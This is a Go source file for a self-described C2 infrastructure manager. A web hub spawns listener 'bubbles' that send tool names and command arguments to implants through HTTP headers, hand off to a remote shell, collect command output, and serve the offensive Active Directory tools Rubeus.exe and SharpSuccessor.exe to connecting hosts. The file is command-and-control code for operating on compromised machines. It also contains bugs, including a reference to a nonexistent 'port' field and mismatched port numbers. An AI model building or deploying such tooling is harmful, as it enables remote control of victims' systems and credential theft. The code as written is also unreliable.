package main

import (
	"encoding/json"
	"fmt"
	"html"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"sync"
)



// to do , change to tun0 for front and local for netcat to use same port
const serverIP = "0.0.0.0"

var (
	bubbleRegistry = make(map[string]*SessionBubble)
	masterMu       sync.Mutex
)


type Listener struct {
	ID      string `json:"id"`
	Address string `json:"address"`
	Active  bool   `json:"active"`
}

type Session struct {
	ID         string `json:"id"`
	RemoteAddr string `json:"remote_addr"`
	LastSeen   string `json:"last_seen"`
}


type SessionBubble struct {
	Name        string
	Port        string
	currentTool string
	currentArgs string
	outputData  string
	listeners   map[string]*Listener
	sessions    map[string]*Session
	mu          sync.Mutex
}


func (sb *SessionBubble) commandVar(w http.ResponseWriter, r *http.Request) {
	sb.mu.Lock()
	defer sb.mu.Unlock()

	if sb.currentTool != "shell" {
		w.Header().Add("tool", sb.currentTool)
		w.Header().Add("args", sb.currentArgs)
	} else {

		w.Header().Add("Location", fmt.Sprintf("http://%s:%s/shell", serverIP, sb.Port)) 
		// to do add in implant
		w.Header().Add("port", sb.port) 

		http.Error(w, "Not Authorized", 401)
	}
}

func (sb *SessionBubble) exec(w http.ResponseWriter, r *http.Request, ToolId string) {
	log.Print(r.RequestURI)
	path := "Tools" 
	data, err := ioutil.ReadFile(fmt.Sprintf("%s/%s", path, ToolId))
	if err != nil {
		log.Printf("Failed to read file: %v", err)
	} else {
		w.Write(data)
	}
}

func (sb *SessionBubble) redirect(w http.ResponseWriter, r *http.Request) {
	ToolId := strings.TrimPrefix(r.URL.Path, "/")
	log.Print(r.RequestURI)

	w.Header().Add("Location", fmt.Sprintf("http://%s:%s/%s", serverIP, sb.Port, ToolId))
	http.Error(w, "Not Authorized", 401)

	sb.exec(w, r, ToolId)
}


func (sb *SessionBubble) Start() {
	mux := http.NewServeMux()

	mux.HandleFunc("/command-var", sb.commandVar)

	mux.HandleFunc("/control", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "index.html")
	})
	mux.HandleFunc("/netcat", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "netcat.html")
	})

	mux.HandleFunc("/update-var", func(w http.ResponseWriter, r *http.Request) {
		sb.mu.Lock()
		sb.currentTool = r.FormValue("tool")
		sb.currentArgs = r.FormValue("cmd")
		sb.mu.Unlock()
		w.Write([]byte("Updated"))
	})

	mux.HandleFunc("/out-var", func(w http.ResponseWriter, r *http.Request) {
		sb.mu.Lock()
		sb.outputData = r.FormValue("out")
		sb.mu.Unlock()
	})

	mux.HandleFunc("/get-var", func(w http.ResponseWriter, r *http.Request) {
		sb.mu.Lock()
		defer sb.mu.Unlock()
		fmt.Fprint(w, html.EscapeString(sb.outputData))
	})

	mux.HandleFunc("/listeners", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "listeners.html")
	})
	mux.HandleFunc("/api/listeners", func(w http.ResponseWriter, r *http.Request) {
		sb.mu.Lock()
		defer sb.mu.Unlock()
		if r.Method == "GET" {
			json.NewEncoder(w).Encode(sb.listeners)
		} else if r.Method == "POST" {
			var l Listener
			json.NewDecoder(r.Body).Decode(&l)
			sb.listeners[l.ID] = &l
			json.NewEncoder(w).Encode(l)
		}
	})

	mux.HandleFunc("/sessions", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "sessions.html")
	})
	mux.HandleFunc("/api/sessions", func(w http.ResponseWriter, r *http.Request) {
		sb.mu.Lock()
		defer sb.mu.Unlock()
		json.NewEncoder(w).Encode(sb.sessions)
	})

	mux.HandleFunc("/Rubeus.exe", sb.redirect)
	mux.HandleFunc("/SharpSuccessor.exe", sb.redirect)


	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request){

		http.NotFound(w, r)
		return
	})



	log.Printf("[+] Bubble '%s' listening on %s:%s", sb.Name, serverIP, sb.Port)
	err := http.ListenAndServe(fmt.Sprintf("%s:%s", serverIP, sb.Port), mux)
	if err != nil {
		log.Printf("[-] Error on bubble %s: %v", sb.Name, err)
	}
}


func main() {
	hub := http.NewServeMux()

	hub.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		html := `
		<html>
		<head><title>C2 Manager</title></head>
		<body style="font-family: monospace; text-align: center; margin-top: 50px;">
			<h1>C2 Infrastructure Manager</h1>
			<p>Port 80 Hub</p>
			<hr style="width: 50%;">
			<br>
			<a href="/listeners"><button style="padding: 15px 30px; font-size: 18px;">Manage Listeners</button></a>
			&nbsp;&nbsp;
			<a href="/sessions"><button style="padding: 15px 30px; font-size: 18px;">View Sessions</button></a>
		</body>
		</html>`
		w.Write([]byte(html))
	})

	hub.HandleFunc("/listeners", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			name := r.FormValue("name")
			port := r.FormValue("port")

			if name == "" || port == "" {
				http.Error(w, "Name and Port required", 400)
				return
			}

			sb := &SessionBubble{
				Name:      name,
				Port:      port,
				listeners: make(map[string]*Listener),
				sessions:  make(map[string]*Session),
			}

			masterMu.Lock()
			bubbleRegistry[name] = sb
			masterMu.Unlock()

			go sb.Start()

			http.Redirect(w, r, "/sessions", http.StatusSeeOther)
			return
		}

		html := `
		<html>
		<body style="font-family: monospace; text-align: center;">
			<h2>Spawn New Listener Bubble</h2>
			<form method="POST">
				<label>Session/Listener Name:</label><br>
				<input type="text" name="name" required><br><br>
				<label>Port (e.g. 8083, 9000):</label><br>
				<input type="text" name="port" required><br><br>
				<button type="submit">Spawn Listener</button>
			</form>
			<br><a href="/">Back</a>
		</body>
		</html>`
		w.Write([]byte(html))
	})

	hub.HandleFunc("/sessions", func(w http.ResponseWriter, r *http.Request) {
		masterMu.Lock()
		defer masterMu.Unlock()

		w.Write([]byte(`<html><body style="font-family: monospace; padding: 20px;"><h2>Active Sessions</h2><ul>`))

		if len(bubbleRegistry) == 0 {
			w.Write([]byte("<p>No active listeners spawned.</p>"))
		}

		for name, sb := range bubbleRegistry {
			linkControl := fmt.Sprintf("http://%s:%s/control", serverIP, sb.Port)
			linkNetcat := fmt.Sprintf("http://%s:%s/netcat", serverIP, sb.Port)
			
			w.Write([]byte(fmt.Sprintf(`
				<li style="margin-bottom: 10px; border: 1px solid #ccc; padding: 10px;">
					<strong>%s</strong> (Port %s)<br>
					<a href="%s" target="_blank">[ Control Panel ]</a> - 
					<a href="%s" target="_blank">[ Netcat Interface ]</a>
				</li>`, name, sb.Port, linkControl, linkNetcat)))
		}

		w.Write([]byte(`</ul><br><a href="/">Back to Home</a></body></html>`))
	})

	log.Printf("Main Manager running on %s:80", serverIP)
	err := http.ListenAndServe(serverIP+":800", hub)
	if err != nil {
		log.Fatal("Manager ListenAndServe: ", err)
	}
}
